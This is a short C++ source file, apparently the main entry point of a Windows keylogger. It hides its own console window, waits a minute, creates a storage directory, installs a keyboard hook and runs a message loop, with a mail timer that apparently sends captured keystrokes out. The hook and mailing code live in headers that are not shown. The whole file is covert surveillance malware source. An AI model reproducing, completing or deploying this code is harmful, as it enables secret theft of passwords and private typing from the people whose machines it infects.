

#include "pch.h"
#include "IO.h"
#include "KeybHook.h"

void hide();

int main()
{
	hide(); 
	MSG Msg; 
	std::this_thread::sleep_for(std::chrono::minutes(1));
	IO::MKDir(IO::GetOurPath(true));
	while (true)
	{
		InstallHook();

		while (GetMessage(&Msg, NULL, 0, 0)) 
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}

		MailTimer.Stop();
		std::this_thread::sleep_for(std::chrono::minutes(1));
	}
	return 0;
}


void hide()
{
	HWND stealth; 
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}